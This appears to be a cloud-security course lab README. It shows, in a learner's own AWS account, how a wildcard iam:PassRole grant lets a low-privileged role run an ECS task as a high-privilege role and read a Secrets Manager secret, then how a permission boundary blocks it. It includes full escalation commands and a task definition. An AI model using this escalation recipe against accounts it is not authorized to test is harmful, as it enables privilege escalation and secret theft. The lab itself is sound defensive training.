# Day 2 lab — Advanced identity: escalate, then cap it

## Objective

Prove, with real AWS API calls against your own account, that a
mis-scoped `iam:PassRole` grant (`Resource: "*"`) plus a policy-attach-shaped
permission (here, `ecs:RegisterTaskDefinition` + `ecs:RunTask`) lets a
low-privileged identity reach a far more privileged role — then attach a
**permission boundary** and re-prove the exact same attempt now fails,
without ever touching the low-priv role's own identity policy.

This is [`content/day02-advanced-identity.md`](../../content/day02-advanced-identity.md)'s
break→harden lab. Read that file's "Core concepts" first if you haven't —
this README assumes you already know the canonical evaluation order and
where a permission boundary sits in it.

> **⚠️ Authorized testing only.** Every command below targets IAM roles and
> an ECS cluster created by this module and `labs/base`, inside **your own
> AWS account**. See [`content/ANTIPATTERNS.md`](../../content/ANTIPATTERNS.md)'s
> authorized-testing statement — the same rule applies here: never point
> any technique in this lab at an account or workload you do not own.

## Prerequisites

- `labs/base` is applied and up (this module reads its state via
  `terraform_remote_state`; it does not create or modify any base
  resource). See `labs/base/README.md`.
- Terraform >= 1.6, AWS provider >= 5.0, AWS CLI v2, `jq`.
- You know your own IAM ARN: `aws sts get-caller-identity --query Arn --output text`.
- **Terraform is not run by this document's author** — you run
  `terraform init/plan/apply/destroy` and every `aws` CLI command yourself.
  Nothing here runs `git` or makes AWS calls on your behalf.

## Set up

```bash
cd labs/day02
cp terraform.tfvars.example terraform.tfvars
# edit terraform.tfvars: set assumer_principal_arn to your own ARN
terraform init
terraform plan
terraform apply
```

This creates `low_priv` (mis-scoped, unattached to any boundary yet),
`high_priv` (the crown-jewel target), the boundary policy (created but not
yet attached — `permission_boundary_enabled = false` by default), a
security group, and a log group for the escalation task.

Capture the values you'll need:

```bash
LOW_PRIV_ARN=$(terraform output -raw low_priv_role_arn)
HIGH_PRIV_ARN=$(terraform output -raw high_priv_role_arn)
CLUSTER_ARN=$(terraform output -raw base_ecs_cluster_arn)
EXEC_ROLE_ARN=$(terraform output -raw base_task_execution_role_arn)
SECRET_ARN=$(terraform output -raw base_secret_arn)
SG_ID=$(terraform output -raw escalate_security_group_id)
LOG_GROUP=$(terraform output -raw escalate_log_group_name)
SUBNET_ID=$(terraform output -json base_public_subnet_ids | jq -r '.[0]')
REGION=$(terraform output -raw region)
```

## THE BREAK

**One line:** low_priv's mis-scoped `iam:PassRole` (`Resource: "*"`) lets it
pass `high_priv` to a new ECS task it registers and runs — the task then
holds `high_priv`'s permissions, which low_priv could never use directly.

### Step 1 — Prove low_priv is denied directly (the baseline)

```bash
CREDS=$(aws sts assume-role --role-arn "$LOW_PRIV_ARN" \
  --role-session-name day02-break --query Credentials --output json)
export AWS_ACCESS_KEY_ID=$(echo "$CREDS" | jq -r .AccessKeyId)
export AWS_SECRET_ACCESS_KEY=$(echo "$CREDS" | jq -r .SecretAccessKey)
export AWS_SESSION_TOKEN=$(echo "$CREDS" | jq -r .SessionToken)

aws sts get-caller-identity
# Expected: Arn ends in assumed-role/<project>-low-priv-role/day02-break

aws secretsmanager get-secret-value --secret-id "$SECRET_ARN"
```

**Expected signal:** `AccessDenied` — low_priv has no
`secretsmanager:GetSecretValue` grant. Keep this terminal's exported
credentials active for the next steps — you're acting as low_priv now.

### Step 2 — Register a task definition that passes high_priv

```bash
cat > /tmp/day02-escalate-taskdef.json <<JSON
{
  "family": "day02-escalate",
  "requiresCompatibilities": ["FARGATE"],
  "networkMode": "awsvpc",
  "cpu": "256",
  "memory": "512",
  "executionRoleArn": "$EXEC_ROLE_ARN",
  "taskRoleArn": "$HIGH_PRIV_ARN",
  "containerDefinitions": [
    {
      "name": "escalate",
      "image": "public.ecr.aws/aws-cli/aws-cli:latest",
      "essential": true,
      "entryPoint": ["sh", "-c"],
      "command": [
        "echo '--- CALLER IDENTITY (watch which role this is) ---'; aws sts get-caller-identity; echo '--- SECRET ACCESS CHECK (value intentionally NOT printed - see ANTIPATTERNS.md #10) ---'; aws secretsmanager get-secret-value --secret-id \"$APP_SECRET_ARN\" --query SecretString --output text >/dev/null 2>&1 && echo 'SECRET READ: SUCCESS' || echo 'SECRET READ: FAILED'"
      ],
      "environment": [{ "name": "APP_SECRET_ARN", "value": "$SECRET_ARN" }],
      "logConfiguration": {
        "logDriver": "awslogs",
        "options": {
          "awslogs-group": "$LOG_GROUP",
          "awslogs-region": "$REGION",
          "awslogs-stream-prefix": "escalate"
        }
      }
    }
  ]
}
JSON

aws ecs register-task-definition --cli-input-json file:///tmp/day02-escalate-taskdef.json
```

**Expected signal:** succeeds — this is `low_priv` exercising its
wildcarded `iam:PassRole` on both `executionRoleArn` and `taskRoleArn`
(the latter being `high_priv`, a role it was never meant to reach).

> Per AWS's own documentation, `iam:PassRole` is checked at
> `RegisterTaskDefinition` — that's the likely point where a PassRole
> denial would surface, not `run-task`. Either observed point is still a
> valid signal that the escalation is blocked, though: if your account
> instead lets registration through and denies at `run-task` in Step 3,
> that's the same escalation attempt being stopped at a different point
> in the same call chain (see THE HARDEN below either way).

### Step 3 — Run the task and read its logs

```bash
TASK_ARN=$(aws ecs run-task \
  --cluster "$CLUSTER_ARN" \
  --launch-type FARGATE \
  --task-definition day02-escalate \
  --network-configuration "awsvpcConfiguration={subnets=[$SUBNET_ID],securityGroups=[$SG_ID],assignPublicIp=ENABLED}" \
  --query 'tasks[0].taskArn' --output text)

aws ecs wait tasks-stopped --cluster "$CLUSTER_ARN" --tasks "$TASK_ARN"

STREAM=$(aws logs describe-log-streams --log-group-name "$LOG_GROUP" \
  --order-by LastEventTime --descending --max-items 1 \
  --query 'logStreams[0].logStreamName' --output text)

aws logs get-log-events --log-group-name "$LOG_GROUP" --log-stream-name "$STREAM"
```

**Expected signal (the escalation, proven):**

```
--- CALLER IDENTITY (watch which role this is) ---
{
    "UserId": "...:escalate",
    "Account": "<your-account-id>",
    "Arn": "arn:aws:sts::<your-account-id>:assumed-role/<project>-high-priv-role/escalate"
}
--- SECRET ACCESS CHECK (value intentionally NOT printed - see ANTIPATTERNS.md #10) ---
SECRET READ: SUCCESS
```

The `Arn` shows `high-priv-role`, not `low-priv-role` — a task that
low_priv itself launched is now running with, and successfully using,
permissions low_priv was directly denied in Step 1. That is privilege
escalation, and it happened without changing low_priv's identity policy at
all — see `content/day02-advanced-identity.md`'s "Core concepts" and
[`ANTIPATTERNS.md`](../../content/ANTIPATTERNS.md) #6.

## THE HARDEN

**One line:** attach a permission boundary to low_priv that never allows
`iam:PassRole` (or the ECS actions) — the same escalation attempt now fails,
without editing low_priv's identity policy.

```bash
# unset the low_priv session creds from THE BREAK first, or open a fresh
# shell — you need your own admin credentials to run terraform again
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN

# edit terraform.tfvars: permission_boundary_enabled = true
terraform apply
```

Re-assume low_priv fresh, and repeat the exact same attempt:

```bash
CREDS=$(aws sts assume-role --role-arn "$LOW_PRIV_ARN" \
  --role-session-name day02-harden --query Credentials --output json)
export AWS_ACCESS_KEY_ID=$(echo "$CREDS" | jq -r .AccessKeyId)
export AWS_SECRET_ACCESS_KEY=$(echo "$CREDS" | jq -r .SecretAccessKey)
export AWS_SESSION_TOKEN=$(echo "$CREDS" | jq -r .SessionToken)

aws ecs register-task-definition --cli-input-json file:///tmp/day02-escalate-taskdef.json
# or, if that still succeeds in your account/API version:
aws ecs run-task \
  --cluster "$CLUSTER_ARN" --launch-type FARGATE \
  --task-definition day02-escalate \
  --network-configuration "awsvpcConfiguration={subnets=[$SUBNET_ID],securityGroups=[$SG_ID],assignPublicIp=ENABLED}"
```

**Expected signal:** `AccessDenied`, with text naming the permission
boundary specifically (not a generic "no identity-based policy" denial —
see `SOLUTION.md` for the exact expected string). low_priv's identity
policy is unchanged and still grants the wildcarded `iam:PassRole` — the
boundary is what's stopping it now, because the boundary's allow-list never
included `iam:PassRole` in the first place.

> **Caveat on the exact action name in the denial text:** the boundary's
> allow-list omits both `iam:PassRole` and `ecs:RegisterTaskDefinition`/
> `ecs:RunTask`, so depending on which call your account/API version
> checks first, the denied-action *name* in the error text may read
> `iam:PassRole` OR `ecs:RegisterTaskDefinition` — don't fixate on which
> exact action name shows up. The invariant to look for is the phrase
> **"because no permissions boundary allows..."** — that's the tell that
> the boundary, not the identity policy, is what's capping the request,
> regardless of which specific action name appears in front of it.

## Teardown checklist

Day 2 creates no hourly-billing edge/compute resources of its own (no ALB,
no standing ECS service — the escalation task ran once and stopped
itself), so there is no "daily vs. end-of-sprint" split here: tear the
whole module down when you're done with the lab.

```bash
cd labs/day02
terraform destroy
```

- [ ] `terraform state list` in `labs/day02` is empty.
- [ ] `low_priv` and `high_priv` roles and the boundary policy no longer
      appear in `aws iam list-roles` / `aws iam list-policies --scope Local`.
- [ ] (Optional, no cost either way, but tidy) deregister the escalation
      task definition family:
      `aws ecs list-task-definitions --family-prefix day02-escalate` then
      `aws ecs deregister-task-definition --task-definition <arn>` for each
      revision returned.
- [ ] `unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN` in
      your shell — you don't want a stale low_priv session lingering.
- [ ] `cd ../base && terraform plan` shows **no changes** — confirms this
      lab never touched base. Do NOT run `terraform destroy` in `labs/base`
      as part of this lab's teardown; base stays up per the sprint's
      teardown model (see `labs/base/README.md`).
